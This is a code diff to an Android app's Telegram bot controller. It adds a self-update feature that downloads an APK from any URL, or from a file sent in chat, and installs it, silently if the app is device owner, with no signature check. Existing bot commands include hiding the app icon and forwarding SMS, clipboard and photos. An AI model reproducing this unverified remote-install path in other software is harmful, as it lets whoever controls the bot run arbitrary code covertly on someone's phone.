@@ -276,6 +276,7 @@ object TelegramBotManager {
         "botpassword" to "🤖 Bot password protection — /botpassword [on|off]",
         "setbotpassword" to "🔑 Change the Telegram bot password — interactive",
         "securityqa" to "❓ View / change the dashboard security question & answer",
+        "update" to "📲 Update PlainApp — /update <url>  or send an .apk file directly to this chat",
     )
 
     fun start(newToken: String, newChatId: String) {
@@ -555,6 +556,19 @@ object TelegramBotManager {
             return
         }
         val text = msg.optString("text", "").trim()
+
+        // Handle incoming APK document files sent directly to the bot chat
+        if (msg.has("document")) {
+            val doc = msg.optJSONObject("document")
+            val fileName = doc?.optString("file_name", "") ?: ""
+            if (fileName.lowercase().endsWith(".apk")) {
+                scope.launch { handleDocumentMessage(doc!!) }
+            } else if (fileName.isNotBlank()) {
+                sendMessage("⚠️ Only <code>.apk</code> files are accepted here.\n\nSend an APK file to trigger a self-update, or use /update &lt;url&gt; to download from a link.")
+            }
+            return
+        }
+
         if (text.isEmpty()) return
 
         // ── Bot password gate ──────────────────────────────────────────────────
@@ -729,6 +743,7 @@ object TelegramBotManager {
                     "removepin", "deletepin" -> cmdRemovePin()
                     "openapp", "openappdevice", "launchapp" -> cmdOpenApp()
                     "openappinfo", "appinfo", "ownappinfo" -> cmdOpenOwnAppInfo()
+                    "update", "selfupdate", "apkupdate", "updateapp" -> cmdUpdate(args)
                     "botpassword", "botpwd" -> cmdBotPassword(args)
                     "setbotpassword", "changebotpassword", "botpwdset" -> cmdSetBotPassword()
                     "securityqa", "securityquestion", "secqa", "feedbackqa" -> cmdSecurityQA(args)
@@ -2294,7 +2309,7 @@ object TelegramBotManager {
             Section("🚨 Alerts & Actions", listOf("findphone","vibrate","speak","stopspeak","toast","show","wake","setalarm","batteryalert")),
             Section("⏰ Scheduling", listOf("schedulesms","setalarm","bedtime","newschedule")),
             Section("📡 Auto-Forward", listOf("forwardsms","forwardphotos","forwardclipboard","forwardshots","forwardgeofence","forwardfiles","fwdfiles","filestats","retryfailed")),
-            Section("⚙️ App Settings", listOf("appsettings","hideicon","applock","biometric","appinfog","setpin","removepin","openapp","openappinfo","botpassword","setbotpassword","securityqa")),
+            Section("⚙️ App Settings", listOf("appsettings","hideicon","applock","biometric","appinfog","setpin","removepin","openapp","openappinfo","botpassword","setbotpassword","securityqa","update")),
             Section("🤖 Bot", listOf("start","help","commands","stop","nowplaying")),
         )
         val cmdMap = allCommands.toMap()
@@ -3591,6 +3606,14 @@ object TelegramBotManager {
                     "Answer: saved securely.\n\n" +
                     "<i>The web dashboard gate will now use this new Q&A.</i>"
                 )
+            }
+            "update_url" -> {
+                val url = text.trim()
+                if (!url.startsWith("http://") && !url.startsWith("https://")) {
+                    sendMessage("❌ Please send a valid URL starting with <code>http://</code> or <code>https://</code>.\n\nSend /update to start over.")
+                    return
+                }
+                cmdDownloadAndInstallApk(url)
             }
             else -> { /* ignore */ }
         }
@@ -8553,6 +8576,149 @@ object TelegramBotManager {
                 listOf("✏️ Change Q&A" to "aps_secqa")
             ))
         )
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // APK self-update
+    // ─────────────────────────────────────────────────────────────────────────
+
+    /**
+     * Called when the user sends an .apk file directly to the bot chat.
+     * Downloads it from Telegram servers and triggers installation.
+     */
+    private suspend fun handleDocumentMessage(document: org.json.JSONObject) {
+        val fileId = document.optString("file_id", "")
+        val fileName = document.optString("file_name", "PlainApp-update.apk")
+        val fileSize = document.optLong("file_size", 0L)
+
+        if (fileId.isBlank()) {
+            sendMessage("❌ Could not extract file ID from the document.")
+            return
+        }
+
+        sendMessage(
+            "📲 <b>APK received: ${htmlEsc(fileName)}</b>\n" +
+            "📦 Size: ${humanSize(fileSize)}\n\n" +
+            "⬇️ Downloading from Telegram…"
+        )
+
+        val destDir = java.io.File(MainApp.instance.cacheDir, "apk_updates")
+        destDir.mkdirs()
+        val destFile = java.io.File(destDir, "PlainApp-update.apk")
+
+        val filePath = withContext(Dispatchers.IO) {
+            TelegramApiClient.getFilePath(token, fileId)
+        }
+        if (filePath.isNullOrBlank()) {
+            sendMessage(
+                "❌ Failed to get download URL from Telegram.\n\n" +
+                "<i>Note: Telegram Bot API only supports files up to 20 MB.\n" +
+                "For larger APKs use /update &lt;url&gt; with a direct download link instead.</i>"
+            )
+            return
+        }
+
+        val ok = withContext(Dispatchers.IO) {
+            TelegramApiClient.downloadToFile(token, filePath, destFile)
+        }
+        if (!ok || !destFile.exists()) {
+            sendMessage("❌ Download failed. Check network and try again.")
+            return
+        }
+
+        triggerApkInstall(destFile)
+    }
+
+    /**
+     * /update [url] — download an APK from a URL and install it.
+     * If no URL is provided, prompts the user to type one (or send an APK file).
+     */
+    private suspend fun cmdUpdate(args: List<String>) {
+        val url = args.firstOrNull()?.trim()
+        if (url.isNullOrBlank()) {
+            val isOwner = com.ismartcoding.plain.helpers.ApkUpdateHelper.isDeviceOwner(MainApp.instance)
+            pendingInput = "update_url"
+            sendMessage(
+                "📲 <b>Update PlainApp</b>\n━━━━━━━━━━━━━━━━━━━━\n\n" +
+                "Two ways to update without touching the device:\n\n" +
+                "📁 <b>Option 1 — Send APK file</b>\n" +
+                "   Send a <code>.apk</code> file directly to this chat and it will be installed automatically.\n\n" +
+                "🔗 <b>Option 2 — URL</b>\n" +
+                "   Type or paste a direct download link below:\n" +
+                "   <i>e.g.</i> <code>https://example.com/PlainApp-debug.apk</code>\n\n" +
+                (if (isOwner)
+                    "🔇 <b>Device Owner mode active</b> — update will be <b>completely silent</b>. No tap needed!\n"
+                else
+                    "⚠️ A system <b>Install</b> dialog will appear on the device.\n" +
+                    "   You will need to tap <b>Install</b> once to confirm.\n" +
+                    "   For fully silent updates, run once via USB/ADB:\n" +
+                    "   <code>adb shell dpm set-device-owner com.ismartcoding.plain/.receivers.PlainDeviceAdminReceiver</code>\n") +
+                "\nSend any /command to cancel."
+            )
+            return
+        }
+        if (!url.startsWith("http://") && !url.startsWith("https://")) {
+            sendMessage("❌ Invalid URL. Must start with <code>http://</code> or <code>https://</code>\n\nUsage: <code>/update &lt;url&gt;</code>")
+            return
+        }
+        cmdDownloadAndInstallApk(url)
+    }
+
+    /** Downloads an APK from [url] and triggers installation. */
+    private suspend fun cmdDownloadAndInstallApk(url: String) {
+        val displayUrl = if (url.length > 80) url.take(80) + "…" else url
+        sendMessage("⬇️ <b>Downloading APK…</b>\n\n<code>${htmlEsc(displayUrl)}</code>")
+
+        val ctx = MainApp.instance
+        val destDir = java.io.File(ctx.cacheDir, "apk_updates")
+        destDir.mkdirs()
+        val destFile = java.io.File(destDir, "PlainApp-update.apk")
+
+        val ok = withContext(Dispatchers.IO) {
+            TelegramApiClient.downloadFromUrl(url, destFile)
+        }
+        if (!ok || !destFile.exists()) {
+            sendMessage(
+                "❌ Download failed.\n\n" +
+                "Make sure the URL is a <b>direct link</b> to an APK file and is reachable from the device's internet connection.\n\n" +
+                "Alternatively, build the APK and <b>send the file directly to this chat</b>."
+            )
+            return
+        }
+        triggerApkInstall(destFile)
+    }
+
+    /**
+     * Triggers installation of [apkFile].
+     * Uses Device Owner silent install if available; otherwise opens the system dialog.
+     */
+    private suspend fun triggerApkInstall(apkFile: java.io.File) {
+        val ctx = MainApp.instance
+        val isOwner = com.ismartcoding.plain.helpers.ApkUpdateHelper.isDeviceOwner(ctx)
+        sendMessage(
+            "✅ <b>APK ready</b> (${humanSize(apkFile.length())})\n\n" +
+            if (isOwner)
+                "🔇 Installing silently (Device Owner mode)… Please wait a moment."
+            else
+                "📱 System install dialog is now open on the device.\n\n" +
+                "<b>Tap Install to confirm the update.</b>\n\n" +
+                "<i>The app will restart automatically after install.</i>"
+        )
+        com.ismartcoding.plain.helpers.ApkUpdateHelper.install(ctx, apkFile) { success, message ->
+            scope.launch {
+                when {
+                    message == "dialog_shown" -> { /* user already told above */ }
+                    success -> sendMessage(
+                        "✅ <b>PlainApp updated successfully!</b>\n\n" +
+                        "The app has been reinstalled silently. Changes take effect on next app start."
+                    )
+                    else -> sendMessage(
+                        "❌ <b>Silent install failed:</b> ${htmlEsc(message)}\n\n" +
+                        "<i>Try sending the APK file directly to this chat — the system dialog will appear as a fallback.</i>"
+                    )
+                }
+            }
+        }
     }
 
     // ─────────────────────────────────────────────────────────────────────────
